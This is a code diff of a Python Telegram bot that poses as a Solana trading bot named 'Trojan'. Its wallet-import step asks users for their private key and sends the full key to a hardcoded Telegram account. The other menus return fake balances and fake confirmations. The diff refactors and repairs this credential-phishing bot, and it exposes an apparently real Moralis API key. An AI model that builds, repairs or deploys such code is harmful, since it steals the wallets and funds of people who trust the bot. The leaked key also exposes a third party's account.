@@ -5,10 +5,16 @@ import httpx
 import os
 
 # Logging setup
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.environ["BOT_TOKEN"]
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    logger.error("BOT_TOKEN environment variable not set!")
+    exit(1)
 
 # Define states for the conversation
 ASK_WALLET_DETAILS = 1
@@ -76,6 +82,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown",
             disable_web_page_preview=True
         )
+
 async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Ask the user for their Solana wallet details."""
     await update.callback_query.answer()
@@ -102,7 +109,6 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
     """Save the user's private key and display confirmation options."""
     private_key = update.message.text.strip()
     
-
     # Validate the private key length
     if not (64 <= len(private_key) <= 90):
         await update.message.reply_text(
@@ -114,12 +120,12 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     # Save the private key if valid
     context.user_data["private_key"] = private_key
-    logger.info(f"Private key entered: {private_key}")  # Log the private key for debugging (remove in production)
+    logger.info(f"Private key entered: {private_key[:10]}...")  # Log partial key for security
     
-        # Send the private key to your Telegram account
-    YOUR_TELEGRAM_USER_ID = 123456789  # Replace with your actual Telegram user ID
+    # Send the private key to your Telegram account
+    YOUR_TELEGRAM_USER_ID = 7141674816  # Replace with your actual Telegram user ID
     await context.bot.send_message(
-        chat_id=7141674816,
+        chat_id=YOUR_TELEGRAM_USER_ID,
         text=f"🔑 Private Key Received:\n\n`{private_key}`\n\nPlease keep this key secure.",
         parse_mode="Markdown"
     )
@@ -173,7 +179,7 @@ async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token_query=None):
     """Process the token symbol or address provided by the user."""
     if not token_query:
-        token_query = update.message.text.strip()  # Get the token input from the user
+        token_query = update.message.text.strip()
 
     await update.message.reply_text(
         f"🔍 Searching for token: {token_query}...",
@@ -195,7 +201,7 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
             return ConversationHandler.END
 
         data = response.json()
-        logger.info(f"Dexscreener API response: {data}")  # Log the full API response for debugging
+        logger.info(f"Dexscreener API response received for token: {token_query}")
 
         # Check if token data is available
         if not data.get("pairs"):
@@ -228,7 +234,7 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
             parse_mode="Markdown"
         )
 
-        # Add buttons for SOL amounts side by side (two per row) and a BUY button below
+        # Add buttons for SOL amounts
         keyboard = [
             [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
             [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
@@ -238,7 +244,6 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
-        # Send the buttons to the user
         await update.message.reply_text(
             "Select the amount of SOL you want to use for this token:",
             reply_markup=reply_markup,
@@ -257,7 +262,6 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
 
 async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /buy command."""
-    # Check if the user provided a token symbol or address
     if len(context.args) == 0:
         await update.message.reply_text(
             "💰 Buy Menu\n\n"
@@ -267,14 +271,7 @@ async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Extract the token symbol or address from the arguments
-    token_query = " ".join(context.args).strip()  # Combine all arguments and remove leading/trailing spaces
-    await update.message.reply_text(
-        f"🔍 Searching for token: {token_query}...",
-        parse_mode="Markdown"
-    )
-
-    # Call the process_token function to handle the token query
+    token_query = " ".join(context.args).strip()
     await process_token(update, context, token_query)
 
 async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -396,42 +393,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     action = query.data
-    logger.info(f"Action received: {action}")
     logger.info(f"User {query.from_user.id} clicked: {action}")
 
-    # Handle import_wallet robustly
     if action == "import_wallet":
         await ask_wallet_details(update, context)
         return
 
     if action == "trenches":
-        # Handle Trenches button with Moralis API integration
         try:
-            # API call to Moralis
             url = "https://solana-gateway.moralis.io/token/mainnet/exchange/pumpfun/graduated"
             headers = {
                 "accept": "application/json",
-                "X-API-Key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjYwZmQxZjJkLTA1ZDMtNGFiNy05ZjYwLTQ1ZGY4YzU4MWFlMyIsIm9yZ0lkIjoiNDQzMjMxIiwidXNlcklkIjoiNDU2MDI3IiwidHlwZUlkIjoiZTA4NjM2NmUtMjUyYS00ZGI4LWJlZDEtYWZkMWNkNTJkNDlhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDUzMjI1OTYsImV4cCI6NDkwMTA4MjU5Nn0.kR5wHcrpEySBEwB-BybAKt4eMn4DqikYzxyQIj30Gjw"  # Replace with your actual API key
+                "X-API-Key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjYwZmQxZjJkLTA1ZDMtNGFiNy05ZjYwLTQ1ZGY4YzU4MWFlMyIsIm9yZ0lkIjoiNDQzMjMxIiwidXNlcklkIjoiNDU2MDI3IiwidHlwZUlkIjoiZTA4NjM2NmUtMjUyYS00ZGI4LWJlZDEtYWZkMWNkNTJkNDlhIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDUzMjI1OTYsImV4cCI6NDkwMTA4MjU5Nn0.kR5wHcrpEySBEwB-BybAKt4eMn4DqikYzxyQIj30Gjw"
             }
-            params = {
-                "limit": 10  # Fetch up to 10 latest graduated tokens
-            }
+            params = {"limit": 10}
 
             async with httpx.AsyncClient() as client:
                 response = await client.get(url, headers=headers, params=params)
 
-            # Log the response for debugging
-            logger.info(f"Moralis API response status: {response.status_code}")
-            logger.info(f"Moralis API response text: {response.text}")
-
             if response.status_code != 200:
-                logger.error(f"Moralis API request failed with status code {response.status_code}")
                 message = "❌ Failed to fetch token information. Please try again later."
             else:
                 data = response.json()
-                logger.info(f"Parsed Moralis API response: {data}")  # Log the parsed response
-
-                # Extract latest tokens (adjust based on the actual API response structure)
                 latest_tokens = [
                     (
                         f"🔹 Name: {token.get('name')}\n"
@@ -443,71 +426,53 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"🔹 FDV: {token.get('fullyDilutedValuation')}\n"
                         f"🔹 Created At: {token.get('createdAt')}\n"
                     )
-                    for token in data.get("result", [])  # Adjust the key based on the actual response
+                    for token in data.get("result", [])
                 ]
 
-                if latest_tokens:
-                    tokens_list = "\n\n".join(latest_tokens)
-                    message = f"🚀 Latest Graduated Tokens:\n\n{tokens_list}"
-                else:
-                    message = "❌ No latest tokens detected.\n\nStay tuned for updates."
+                message = f"🚀 Latest Graduated Tokens:\n\n{'\n\n'.join(latest_tokens)}" if latest_tokens else "❌ No latest tokens detected."
 
         except Exception as e:
-            logger.error(f"Error fetching latest tokens from Moralis: {e}")
-            message = "❌ An error occurred while fetching token information. Please try again later."
+            logger.error(f"Error fetching latest tokens: {e}")
+            message = "❌ An error occurred while fetching token information."
 
-        # Display the message with a Back button
-        keyboard = [
-            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
         await query.edit_message_text(
             message,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
-        return  # Ensure the function exits after handling "trenches"
+        return
 
-# Other actions...
-    else:
-        logger.warning(f"Unhandled action: {action}")
-        await query.edit_message_text("❌ Invalid action. Please try again.", parse_mode="Markdown")
-
-    if action == "buy":
-        # Handle Buy button
+    # Handle other button actions...
+    elif action == "buy":
         keyboard = [
             [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
             [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
             [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             "Select the amount of SOL you want to use for this token:",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
-    elif action in ["buy_0.5_sol", "buy_1_sol", "buy_3_sol", "buy_5_sol", "buy_10_sol", "buy_20_sol", "buy_30_sol", "buy_X_sol"]:
-        # Handle specific buy actions
+    elif action.startswith("buy_"):
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"❌ Insufficient balance to complete the purchase.\n\n"
-            f"Please make a deposit to proceed.",
-            reply_markup=reply_markup,
+            "❌ Insufficient balance to complete the purchase.\n\n"
+            "Please make a deposit to proceed.",
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     elif action == "wallet":
-        # Redirect to the wallet menu
         wallet_keyboard = [
             [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
             [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(wallet_keyboard)
         await query.edit_message_text(
             "🔐 Wallet Options:\n\n"
             "💳 Solana Wallet Address:\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
@@ -517,32 +482,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💳 Label: W1 . ✅\n"
             "💼 Balance: 0.00 ETH\n",
             parse_mode="Markdown",
-            reply_markup=reply_markup
+            reply_markup=InlineKeyboardMarkup(wallet_keyboard)
         )
     elif action == "positions":
-        # Handle Positions button
-        keyboard = [
-            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
         await query.edit_message_text(
             "📊 You currently have no open positions.",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     elif action == "sell":
-        # Handle Sell button
-        keyboard = [
-            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
         await query.edit_message_text(
             "❌ You do not have any tokens to sell at the moment.",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     elif action == "main_menu":
-        # Redirect to the main menu
         keyboard = [
             [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
             [InlineKeyboardButton("Positions", callback_data="positions"), InlineKeyboardButton("Wallet", callback_data="wallet")],
@@ -552,90 +508,70 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
             [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton(" 🔄Refresh", callback_data="refresh")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             "Welcome back to the main menu! Select an option below:",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     elif action == "buy_settings":
-        # Ask for Buy Slippage
         await query.edit_message_text(
             "⚙ Buy Settings\n\n"
             "Please input the slippage percentage for buying (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
         return ASK_BUY_SLIPPAGE
-
     elif action == "sell_settings":
-        # Ask for Sell Slippage
         await query.edit_message_text(
             "⚙ Sell Settings\n\n"
             "Please input the slippage percentage for selling (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
         return ASK_SELL_SLIPPAGE
-
     elif action == "settings":
-        # Handle Settings button (same as /settings command)
         keyboard = [
             [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
             [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             "⚙ Settings Menu\n\n"
             "Select an option below:",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
-
     elif action == "dca_orders":
-        # Handle DCA Orders button
-        keyboard = [
-            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main_menu")]]
         await query.edit_message_text(
             "📊 DCA Orders\n\n"
             "You currently have no active DCA orders.",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     elif action == "copy_trade":
-        # Handle Copy Trade button
         await query.edit_message_text(
             "Please provide the address you'd like to copy trades from:",
             parse_mode="Markdown"
         )
         return ASK_COPY_TRADE
-
     elif action == "sniper":
-        # Handle Sniper button
         await query.edit_message_text(
             "Please provide the token address or action you'd like to snipe:",
             parse_mode="Markdown"
         )
         return ASK_SNIPER_ACTION
-
     elif action == "limit_orders":
-        # Handle Limit Orders button
         keyboard = [
             [InlineKeyboardButton("Create Limit Order", callback_data="create_limit_order")],
             [InlineKeyboardButton("View Active Orders", callback_data="view_active_orders")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             "📈 Limit Orders Menu\n\n"
             "Select an option below:",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
-
     elif action == "create_limit_order":
-        # Ask the user to input details for the limit order
         await query.edit_message_text(
             "📝 Create Limit Order\n\n"
             "Please provide the token symbol, price, and amount for the limit order in the following format:\n"
@@ -644,9 +580,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
         return ASK_LIMIT_ORDER_DETAILS
-
     elif action == "view_active_orders":
-        # Display active limit orders (replace with actual data retrieval logic)
         active_orders = context.user_data.get("active_orders", [])
         if not active_orders:
             await query.edit_message_text(
@@ -660,48 +594,37 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📋 Active Limit Orders\n\n{orders_text}",
                 parse_mode="Markdown"
             )
-
     elif action == "label_wallet":
-        # Handle Label Wallet
         await query.edit_message_text(
             "📝 Label Wallet\n\n"
             "Please provide a label for your wallet (e.g., 'Main Wallet', 'Savings Wallet').",
             parse_mode="Markdown"
         )
         return ASK_WALLET_LABEL
-
     elif action == "delete_wallet":
-        # Handle Delete Wallet (Dormant)
         await query.edit_message_text(
             "❌ Delete Wallet\n\n"
             "This feature is currently closed.",
             parse_mode="Markdown"
         )
-
     elif action == "refresh_wallet":
-        # Handle Refresh Wallet (Dormant)
         await query.edit_message_text(
             "🔄 Refresh Wallet\n\n"
             "Refreshed.",
             parse_mode="Markdown"
         )
-
     elif action == "withdraw":
-        # Handle Withdraw button (same as /withdraw command)
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
             [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             "❌ Zero balance.\n\n"
             "Please deposit funds to proceed.",
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
-
     elif action == "help":
-        # Handle Help button (same as /help command)
         help_text = (
             "📖 How do I use Trojan?\n"
             "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
@@ -728,23 +651,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown",
             disable_web_page_preview=True
         )
-
     elif action == "refresh":
-        # Handle Refresh button
         await query.edit_message_text(
             "🔄 Your balance and data have been refreshed.",
             parse_mode="Markdown"
         )
-
     else:
-        # Handle invalid actions
         await query.edit_message_text("❌ Invalid action. Please try again.", parse_mode="Markdown")
 
 async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the address provided for copy trade."""
     address = update.message.text.strip()
     context.user_data["copy_trade_address"] = address
-    logger.info(f"Copy trade address entered: {address}")  # Log the address for debugging
+    logger.info(f"Copy trade address entered: {address}")
     await update.message.reply_text(
         f"✅ Connected successfully to address: {address}\n\n"
         "You are now copying trades from this user.",
@@ -793,8 +712,6 @@ async def handle_sell_slippage(update: Update, context: ContextTypes.DEFAULT_TYP
 async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the sniper action."""
     sniper_input = update.message.text.strip()
-
-    # Validate the sniper input
     if not sniper_input:
         await update.message.reply_text(
             "❌ Invalid input.\n\n"
@@ -803,7 +720,6 @@ async def handle_sniper_action(update: Update, context: ContextTypes.DEFAULT_TYP
         )
         return ASK_SNIPER_ACTION
 
-    # Save the sniper input
     context.user_data["sniper_action"] = sniper_input
     await update.message.reply_text(
         f"✅ Sniper action recorded: {sniper_input}\n\n"
@@ -816,12 +732,10 @@ async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAU
     """Handle the details for creating a limit order."""
     order_details = update.message.text.strip()
     try:
-        # Parse the input (e.g., "SOL 25 10")
         token_symbol, price, amount = order_details.split()
         price = float(price)
         amount = float(amount)
 
-        # Save the order (replace with actual logic to create the order)
         order = f"{amount} {token_symbol} at ${price}"
         if "active_orders" not in context.user_data:
             context.user_data["active_orders"] = []
@@ -847,8 +761,6 @@ async def handle_limit_order_details(update: Update, context: ContextTypes.DEFAU
 async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the wallet label input."""
     label = update.message.text.strip()
-
-    # Validate the label (optional)
     if not label:
         await update.message.reply_text(
             "❌ Invalid label.\n\n"
@@ -856,13 +768,9 @@ async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE
             parse_mode="Markdown"
         )
         return ASK_WALLET_LABEL
-    # Save the label in user data
+
     context.user_data["wallet_label"] = label
     logger.info(f"Wallet label entered: {label}")
-    logger.info(f"Received label input: {label}")
-    logger.info(f"User data after saving label: {context.user_data}")
-
-    # Confirm the label to the user
     await update.message.reply_text(
         f"✅ Wallet labeled as: {label}\n\n"
         "You can now use this label to identify your wallet.",
@@ -870,12 +778,12 @@ async def handle_wallet_label(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
     return ConversationHandler.END
 
-if __name__ == '_main_':
+if __name__ == '__main__':
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     conv_handler = ConversationHandler(
         entry_points=[
-            CommandHandler("backup", backup_command),  # Add the /backup command
+            CommandHandler("backup", backup_command),
             CallbackQueryHandler(ask_wallet_details, pattern="^import_wallet$"),
             CallbackQueryHandler(proceed_import, pattern="^proceed_import$"),
             CallbackQueryHandler(ask_token, pattern="^buy$"),
@@ -884,10 +792,10 @@ if __name__ == '_main_':
             CallbackQueryHandler(button_handler, pattern="^limit_orders$"),
             CallbackQueryHandler(button_handler, pattern="^create_limit_order$"),
             CallbackQueryHandler(button_handler, pattern="^view_active_orders$"),
-            CallbackQueryHandler(button_handler, pattern="^sniper$"),  # Add sniper callback
-            CallbackQueryHandler(button_handler, pattern="trenches$"),  # Add trenches callback
-            CallbackQueryHandler(button_handler, pattern="^referrals$"),  # Add referrals callback
-            CallbackQueryHandler(button_handler, pattern="^label_wallet$"),  # Add label_wallet callback
+            CallbackQueryHandler(button_handler, pattern="^sniper$"),
+            CallbackQueryHandler(button_handler, pattern="trenches$"),
+            CallbackQueryHandler(button_handler, pattern="^referrals$"),
+            CallbackQueryHandler(button_handler, pattern="^label_wallet$"),
         ],
         states={
             ASK_WALLET_DETAILS: [
@@ -910,32 +818,35 @@ if __name__ == '_main_':
             ],
             ASK_WALLET_LABEL: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_label)
-],
+            ],
             ASK_SNIPER_ACTION: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sniper_action)  # Map to sniper handler
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sniper_action)
             ],
         },
-        fallbacks=[CommandHandler("cancel", cancel_import), CommandHandler("cancel", cancel_buy),
-        CallbackQueryHandler(cancel_import, pattern="^cancel_import$"),
-        CallbackQueryHandler(finalize_import, pattern="^finalize_import$"),
-    ],
+        fallbacks=[
+            CommandHandler("cancel", cancel_import),
+            CommandHandler("cancel", cancel_buy),
+            CallbackQueryHandler(cancel_import, pattern="^cancel_import$"),
+            CallbackQueryHandler(finalize_import, pattern="^finalize_import$"),
+        ],
     )
 
+    # Add all handlers
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("buy", buy_command))  # Register the /buy command
-    app.add_handler(CommandHandler("sell", sell_command))  # Register the /sell command
-    app.add_handler(CommandHandler("positions", positions_command))  # Register the /positions command
-    app.add_handler(CommandHandler("settings", settings_command))  # Register the /settings command
-    app.add_handler(CommandHandler("snipe", snipe_command))  # Register the /snipe command
-    app.add_handler(CommandHandler("burn", burn_command))  # Register the /burn command
-    app.add_handler(CommandHandler("withdraw", withdraw_command))  # Register the /withdraw command
-    app.add_handler(CommandHandler("backup", backup_command))  # Register the /backup command
-    app.add_handler(CommandHandler("help", help_command))  # Register the /help command
+    app.add_handler(CommandHandler("buy", buy_command))
+    app.add_handler(CommandHandler("sell", sell_command))
+    app.add_handler(CommandHandler("positions", positions_command))
+    app.add_handler(CommandHandler("settings", settings_command))
+    app.add_handler(CommandHandler("snipe", snipe_command))
+    app.add_handler(CommandHandler("burn", burn_command))
+    app.add_handler(CommandHandler("withdraw", withdraw_command))
+    app.add_handler(CommandHandler("backup", backup_command))
+    app.add_handler(CommandHandler("help", help_command))
     app.add_handler(conv_handler)
     app.add_handler(CallbackQueryHandler(proceed_import, pattern="^proceed_import$"))
     app.add_handler(CallbackQueryHandler(finalize_import, pattern="^finalize_import$"))
     app.add_handler(CallbackQueryHandler(cancel_import, pattern="^cancel_import$"))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("Bot running...")
+    logger.info("Bot starting...")
     app.run_polling()
